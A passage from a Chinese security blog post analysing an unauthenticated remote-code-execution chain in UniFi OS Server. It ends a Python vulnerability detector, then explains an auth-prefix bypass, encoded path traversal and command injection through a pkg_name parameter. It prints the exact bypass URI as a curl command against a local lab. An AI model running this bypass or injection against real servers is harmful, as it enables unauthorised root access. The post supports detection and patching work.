ssl._create_unverified_context()</span><br><span class="line">    conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn.request(</span><br><span class="line">            <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">            target,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">        )</span><br><span class="line">        resp = conn.getresponse()</span><br><span class="line">        body = resp.read(max_bytes).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> resp.status, (resp.getheader(<span class="string">&quot;Content-Type&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>), body</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_unifi_os</span>(<span class="params">host, port, timeout</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Confirm the host serves the UniFi OS management portal via the root-page</span></span><br><span class="line"><span class="string">    fingerprint (same surface the nuclei UOS templates match). Used only to make</span></span><br><span class="line"><span class="string">    the &#x27;not a UniFi OS Server&#x27; verdict conclusive rather than merely inconclusive.</span></span><br><span class="line"><span class="string">    Reads more of the body than the probe path because the manifest/container</span></span><br><span class="line"><span class="string">    markers sit further down the document than the &lt;title&gt;.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _, _, body = fetch(host, port, <span class="string">&quot;/&quot;</span>, timeout, max_bytes=<span class="number">65536</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(m <span class="keyword">in</span> body <span class="keyword">for</span> m <span class="keyword">in</span> UOS_FINGERPRINT_MARKERS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_bypass</span>(<span class="params">host, port, timeout</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Run the behavioral probe + baseline control. Returns &#123;state, detail&#125;.&quot;&quot;&quot;</span></span><br><span class="line">    base_status = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base_status, _, _ = fetch(host, port, BASELINE, timeout)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># baseline is only a corroborating control; tolerate its failure</span></span><br><span class="line"></span><br><span class="line">    status, ctype, body = fetch(host, port, BYPASS_PROBE, timeout)</span><br><span class="line">    reached_handler = <span class="built_in">any</span>(m <span class="keyword">in</span> body <span class="keyword">for</span> m <span class="keyword">in</span> VULN_HANDLER_MARKERS)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">200</span> <span class="keyword">and</span> reached_handler:</span><br><span class="line">        <span class="keyword">if</span> base_status == <span class="number">401</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;state&quot;</span>: <span class="string">&quot;vulnerable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;auth bypass reached the vulnerable handler &quot;</span></span><br><span class="line">                <span class="string">&quot;(no command executed); baseline correctly 401&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment"># Reached the handler but the control wasn&#x27;t 401 -&gt; still vulnerable, but</span></span><br><span class="line">        <span class="comment"># the host may also be open/misconfigured; flag it for human review.</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;state&quot;</span>: <span class="string">&quot;vulnerable&quot;</span>,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">f&quot;auth bypass reached the vulnerable handler; &quot;</span></span><br><span class="line">            <span class="string">f&quot;baseline status=<span class="subst">&#123;base_status&#125;</span> (expected 401) — review&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">400</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;state&quot;</span>: <span class="string">&quot;patched&quot;</span>,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;nginx rejected the normalized-path divergence &quot;</span></span><br><span class="line">            <span class="string">&quot;(HTTP 400) — 5.0.8+ behavior&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> status == <span class="number">401</span>:</span><br><span class="line">        <span class="comment"># An auth layer rejected the bypass. On a confirmed UniFi OS box the bypass</span></span><br><span class="line">        <span class="comment"># was blocked but we can&#x27;t tell patched-vs-mitigated-vs-other, so it&#x27;s</span></span><br><span class="line">        <span class="comment"># inconclusive; a non-UniFi proxy that 401s everything is simply not affected.</span></span><br><span class="line">        <span class="comment"># Fingerprint the root page to tell the two apart.</span></span><br><span class="line">        <span class="keyword">if</span> is_unifi_os(host, port, timeout):</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;state&quot;</span>: <span class="string">&quot;inconclusive&quot;</span>,</span><br><span class="line">                <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;bypass blocked / auth enforced (HTTP 401) on a &quot;</span></span><br><span class="line">                <span class="string">&quot;confirmed UniFi OS host — not confirmed vulnerable&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;state&quot;</span>: <span class="string">&quot;not_unifi&quot;</span>,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">&quot;HTTP 401 but no UniFi OS web fingerprint on / &quot;</span></span><br><span class="line">            <span class="string">&quot;— target is not a UniFi OS Server&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># Ambiguous probe response (not the vuln handler, the 5.0.8 nginx guard, or the</span></span><br><span class="line">    <span class="comment"># auth gateway). Use the root-page fingerprint to decide whether this is even a</span></span><br><span class="line">    <span class="comment"># UniFi OS Server: absent -&gt; conclusively not affected; present -&gt; the second</span></span><br><span class="line">    <span class="comment"># inconclusive flavor (UOS, but an unexpected probe response, vs. the auth-enforced</span></span><br><span class="line">    <span class="comment"># 401 above) — leave it for human review. The detail string says which case it is.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_unifi_os(host, port, timeout):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;state&quot;</span>: <span class="string">&quot;not_unifi&quot;</span>,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: <span class="string">f&quot;no UniFi OS web fingerprint on / &quot;</span></span><br><span class="line">            <span class="string">f&quot;(probe HTTP <span class="subst">&#123;status&#125;</span>) — target is not a UniFi OS Server&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;state&quot;</span>: <span class="string">&quot;inconclusive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;detail&quot;</span>: <span class="string">f&quot;UniFi OS detected, but probe returned an &quot;</span></span><br><span class="line">        <span class="string">f&quot;unexpected response: HTTP <span class="subst">&#123;status&#125;</span> <span class="subst">&#123;ctype&#125;</span>&quot;</span>.strip(),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">assess</span>(<span class="params">host, port, timeout</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Probe one target and return the full result dict.&quot;&quot;&quot;</span></span><br><span class="line">    result = &#123;<span class="string">&quot;target&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result[<span class="string">&quot;bypass&quot;</span>] = check_bypass(host, port, timeout)</span><br><span class="line">    <span class="keyword">except</span> (socket.timeout, TimeoutError):</span><br><span class="line">        <span class="keyword">return</span> &#123;**result, <span class="string">&quot;verdict&quot;</span>: <span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="string">&quot;timeout&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">except</span> (socket.gaierror, ConnectionError, OSError) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;**result, <span class="string">&quot;verdict&quot;</span>: <span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># noqa: BLE001 - report anything unexpected, don&#x27;t crash a scan</span></span><br><span class="line">        <span class="keyword">return</span> &#123;**result, <span class="string">&quot;verdict&quot;</span>: <span class="string">&quot;ERROR&quot;</span>, <span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;</span><br><span class="line"></span><br><span class="line">    result[<span class="string">&quot;verdict&quot;</span>] = &#123;</span><br><span class="line">        <span class="string">&quot;vulnerable&quot;</span>: <span class="string">&quot;VULNERABLE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;patched&quot;</span>: <span class="string">&quot;PATCHED&quot;</span>,</span><br><span class="line">        <span class="string">&quot;not_unifi&quot;</span>: <span class="string">&quot;UNAFFECTED&quot;</span>,</span><br><span class="line">        <span class="string">&quot;inconclusive&quot;</span>: <span class="string">&quot;INCONCLUSIVE&quot;</span>,</span><br><span class="line">    &#125;.get(result[<span class="string">&quot;bypass&quot;</span>][<span class="string">&quot;state&quot;</span>], <span class="string">&quot;INCONCLUSIVE&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- output ------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_human</span>(<span class="params">r, color</span>):</span><br><span class="line">    verdict = r[<span class="string">&quot;verdict&quot;</span>]</span><br><span class="line">    marker, style = VERDICT_STYLE.get(verdict, (<span class="string">&quot;[?]&quot;</span>, Ansi.YELLOW))</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;paint(marker, style, color)&#125;</span> <span class="subst">&#123;paint(r[<span class="string">&#x27;target&#x27;</span>], Ansi.BOLD, color)&#125;</span>: &quot;</span></span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;paint(verdict, style, color)&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;      error: <span class="subst">&#123;r[<span class="string">&#x27;error&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;      <span class="subst">&#123;paint(r[<span class="string">&#x27;bypass&#x27;</span>][<span class="string">&#x27;detail&#x27;</span>], Ansi.DIM, color)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_brief</span>(<span class="params">r, color</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;One aligned line per target — convenient for scanning many hosts.&quot;&quot;&quot;</span></span><br><span class="line">    verdict = r[<span class="string">&quot;verdict&quot;</span>]</span><br><span class="line">    _, style = VERDICT_STYLE.get(verdict, (<span class="string">&quot;[?]&quot;</span>, Ansi.YELLOW))</span><br><span class="line">    status = paint(<span class="string">f&quot;<span class="subst">&#123;verdict:&lt;<span class="number">13</span>&#125;</span>&quot;</span>, style, color)</span><br><span class="line">    note = r[<span class="string">&quot;error&quot;</span>] <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> r <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    note = <span class="string">f&quot;  <span class="subst">&#123;paint(note, Ansi.DIM, color)&#125;</span>&quot;</span> <span class="keyword">if</span> note <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;status&#125;</span> <span class="subst">&#123;r[<span class="string">&#x27;target&#x27;</span>]&#125;</span><span class="subst">&#123;note&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- CLI ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_target</span>(<span class="params">raw</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">in</span> raw:</span><br><span class="line">        u = urlsplit(raw)</span><br><span class="line">        <span class="keyword">return</span> u.hostname, (u.port <span class="keyword">or</span> DEFAULT_PORT)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> raw:</span><br><span class="line">        host, _, port = raw.rpartition(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> host, <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">return</span> raw, DEFAULT_PORT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_parser</span>():</span><br><span class="line">    p = argparse.ArgumentParser(</span><br><span class="line">        prog=<span class="string">&quot;cve_2026_34908_check.py&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;Safe detector for UniFi OS Server &lt;=5.0.6 &quot;</span></span><br><span class="line">        <span class="string">&quot;unauthenticated RCE — SA Bulletin 064 &quot;</span></span><br><span class="line">        <span class="string">&quot;(CVE-2026-34908/34909 + CVE-2026-34910).&quot;</span>,</span><br><span class="line">        epilog=<span class="string">&quot;examples:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  cve_2026_34908_check.py 192.168.1.10\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  cve_2026_34908_check.py host-a:11443 https://host-b\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  cve_2026_34908_check.py -f targets.txt --brief\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  cve_2026_34908_check.py -f targets.txt --json &gt; results.json\n&quot;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">    )</span><br><span class="line">    p.add_argument(<span class="string">&quot;targets&quot;</span>, nargs=<span class="string">&quot;*&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;host, host:port, or https://host:port&quot;</span>)</span><br><span class="line">    p.add_argument(</span><br><span class="line">        <span class="string">&quot;-f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--targets-file&quot;</span>,</span><br><span class="line">        metavar=<span class="string">&quot;FILE&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;file with one target per line (&#x27;#&#x27; comments allowed)&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    p.add_argument(</span><br><span class="line">        <span class="string">&quot;--timeout&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="built_in">float</span>,</span><br><span class="line">        default=<span class="number">10.0</span>,</span><br><span class="line">        metavar=<span class="string">&quot;SECS&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;per-request timeout in seconds (default: 10)&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    p.add_argument(</span><br><span class="line">        <span class="string">&quot;--brief&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_true&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;single-line output per target (for scanning many hosts)&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    p.add_argument(<span class="string">&quot;--json&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;emit JSON results&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--no-color&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;disable coloured output&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = build_parser().parse_args()</span><br><span class="line"></span><br><span class="line">    targets = <span class="built_in">list</span>(args.targets)</span><br><span class="line">    <span class="keyword">if</span> args.targets_file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.targets_file) <span class="keyword">as</span> fh:</span><br><span class="line">                targets += [</span><br><span class="line">                    ln.strip()</span><br><span class="line">                    <span class="keyword">for</span> ln <span class="keyword">in</span> fh</span><br><span class="line">                    <span class="keyword">if</span> ln.strip() <span class="keyword">and</span> <span class="keyword">not</span> ln.lstrip().startswith(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;error: cannot read targets file: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> targets:</span><br><span class="line">        build_parser().error(<span class="string">&quot;no targets given (positional or --targets-file)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    color = want_color(args.no_color)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> raw <span class="keyword">in</span> targets:</span><br><span class="line">        host, port = parse_target(raw)</span><br><span class="line">        r = assess(host, port, args.timeout)</span><br><span class="line">        results.append(r)</span><br><span class="line">        <span class="keyword">if</span> args.json:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print_brief(r, color) <span class="keyword">if</span> args.brief <span class="keyword">else</span> print_human(r, color)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.json:</span><br><span class="line">        <span class="built_in">print</span>(json.dumps(results, indent=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">any</span>(r.get(<span class="string">&quot;verdict&quot;</span>) == <span class="string">&quot;VULNERABLE&quot;</span> <span class="keyword">for</span> r <span class="keyword">in</span> results) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有漏洞</p>
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260827233519359.png" alt="image-20260827233519359"></p>
+<p>接下来对rce调用链进行分析</p>
+<h2 id="CVE漏洞概述"><a href="#CVE漏洞概述" class="headerlink" title="CVE漏洞概述"></a>CVE漏洞概述</h2><table>
+<thead>
+<tr>
+<th align="center">CVE ID</th>
+<th align="center">凭据要求</th>
+<th align="center">类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">CVE-2026-34908</td>
+<td align="center">无</td>
+<td align="center">授权缺陷（不当访问控制）</td>
+</tr>
+<tr>
+<td align="center">CVE-2026-34909</td>
+<td align="center">无</td>
+<td align="center">路径穿越</td>
+</tr>
+<tr>
+<td align="center">CVE-2026-34910</td>
+<td align="center">无</td>
+<td align="center">命令注入</td>
+</tr>
+</tbody></table>
+<h3 id="CVE-2026-34908：认证访问控制判断错误"><a href="#CVE-2026-34908：认证访问控制判断错误" class="headerlink" title="CVE-2026-34908：认证访问控制判断错误"></a>CVE-2026-34908：认证访问控制判断错误</h3><p>Nginx 负责处理所有请求，并通过向 <code>unifi-core</code> 节点服务发送子请求来实现身份验证。该服务负责判断一个请求是公开的还是需要身份验证。</p>
+<p><code>/usr/share/unifi-core/app/service.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">authCheck</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// 直接读取Nginx透传的原始未编码请求路径</span></span><br><span class="line">    <span class="keyword">const</span> rawUri = req.<span class="property">headers</span>[<span class="string">&quot;x-original-uri&quot;</span>];</span><br><span class="line">    <span class="comment">// 仅匹配原始字符串前缀放行</span></span><br><span class="line">    <span class="keyword">if</span> (rawUri.<span class="title function_">startsWith</span>(<span class="string">&quot;/api/auth/validate-sso/&quot;</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">writeHead</span>(<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其余路径强制鉴权</span></span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">401</span>);</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时构造这个特殊的URI：<code>/api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package</code></p>
+<p>直接越过校验逻辑，之后Nginx标准化解码后消除<code>../</code>跳转，实际路由指向包更新私有接口<code>/proxy/users/api/v2/ucs/update/latest_package</code></p>
+<h3 id="CVE-2026-34909：路径穿越与-URI-规范化差异"><a href="#CVE-2026-34909：路径穿越与-URI-规范化差异" class="headerlink" title="CVE-2026-34909：路径穿越与 URI 规范化差异"></a>CVE-2026-34909：路径穿越与 URI 规范化差异</h3><p>根据之前的URI解析差异绕过鉴权，后端文件读取接口未过滤<code>../</code>、URL编码穿越字符。</p>
+<table>
+<thead>
+<tr>
+<th>处理阶段</th>
+<th>看到的值</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证子请求</td>
+<td><code>/api/auth/validate-sso/...</code> 前缀</td>
+<td>满足公开 SSO 前缀条件</td>
+</tr>
+<tr>
+<td>路由匹配</td>
+<td>规范化后的 <code>/proxy/users/api/v2/ucs/update/latest_package</code></td>
+<td>选择 users runnable</td>
+</tr>
+<tr>
+<td>业务处理器</td>
+<td><code>/api/v2/ucs/update/latest_package</code></td>
+<td>开始检查 <code>pkg_name</code></td>
+</tr>
+</tbody></table>
+<p>现在来验证一下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k -i -sS --path-as-is <span class="string">&#x27;https://127.0.0.1:11443/api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260828172946494.png" alt="image-20260828172946494"></p>
+<p>这个错误来自 <code>latest_package</code> 业务处理器，证明了：</p>
+<ul>
+<li>认证子请求没有阻断请求；</li>
+<li>编码点段被后续路由处理；</li>
+<li>请求已经落到 users 更新接口；</li>
+<li><code>pkg_name</code> 参数校验开始执行。</li>
+</ul>
+<h3 id="CVE-2026-34910：未认证命令注入"><a href="#CVE-2026-34910：未认证命令注入" class="headerlink" title="CVE-2026-34910：未认证命令注入"></a>CVE-2026-34910：未认证命令注入</h3><p>users 更新接口接受 <code>pkg_name</code> 和 <code>by_cmd</code>；当 <code>by_cmd=true</code> 且包名存在更新通道时，ULP Go 后端会查询 UOS 的 <code>latest-versions</code>。</p>
+<p><code>/usr/sbin/ulp-go-app</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handlePackageUpdate</span><span class="params">(pkgName <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    cmd := fmt.Sprintf(<span class="string">&quot;apt-get install %s -y&quot;</span>, pkgName)</span><br><span class="line">    exec.Command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd).Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时给<code>pkgName</code>注入命令就能以<code>ucs-update</code>运行账号自带免密sudo权限，可无密码调用dpkg、systemctl、useradd、chmod等系统工具，注入命令执行后一键切换Root，完整控制操作系统底层。</p>
+<h2 id="攻击链路"><a href="#攻击链路" class="headerlink" title="攻击链路"></a>攻击链路</h2><p>借用<a target="_blank" rel="noopener" href="https://cailiangfei.blog.csdn.net/">克朗网络安全实验室</a>绘制的流程图</p>
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260828173820453.png" alt="image-20260828173820453"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260828174234139.png" alt="image-20260828174234139"></p>
+<p>验证完之后清理环境</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/uosserver-purge  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/UniFi-OS-%E6%9C%AA%E6%8E%88%E6%9D%83-RCE-%E9%93%BE%E5%88%86%E6%9E%90/image-20260828174452147.png" alt="image-20260828174452147"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis">https://bishopfox.com/blog/popping-root-on-unifi-os-server-unauthenticated-rce-chain-detection-analysis</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42376192/article/details/162356549">https://blog.csdn.net/weixin_42376192/article/details/162356549</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/vuls/488100.html">https://www.freebuf.com/articles/vuls/488100.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ui.com/download/software/unifi-os-server">https://www.ui.com/download/software/unifi-os-server</a></p>
+
+
+            <div class="article-content__end">
+                <span>EOF</span>
+                <span>CHECKSUM_OK</span>
+            </div>
+        </div>
+
+        
+            <aside class="article-sidebar" aria-label="文章目录">
+                <div class="toc-panel">
+                    <p class="toc-panel__title"><span>//</span> CONTENT_MAP</p>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E4%BF%A1%E6%81%AF"><span class="toc-text">背景信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8DUniFi-OS%E7%A1%AC%E4%BB%B6-%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC"><span class="toc-text">受影响UniFi OS硬件&amp;软件版本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UniFi-OS%E5%BA%95%E5%B1%82%E6%9E%B6%E6%9E%84%EF%BC%9ANginx-unifi-core%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-text">UniFi OS底层架构：Nginx+unifi-core分层模型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-text">检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">CVE漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-34908%EF%BC%9A%E8%AE%A4%E8%AF%81%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%A4%E6%96%AD%E9%94%99%E8%AF%AF"><span class="toc-text">CVE-2026-34908：认证访问控制判断错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-34909%EF%BC%9A%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E-URI-%E8%A7%84%E8%8C%83%E5%8C%96%E5%B7%AE%E5%BC%82"><span class="toc-text">CVE-2026-34909：路径穿越与 URI 规范化差异</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-34910%EF%BC%9A%E6%9C%AA%E8%AE%A4%E8%AF%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span 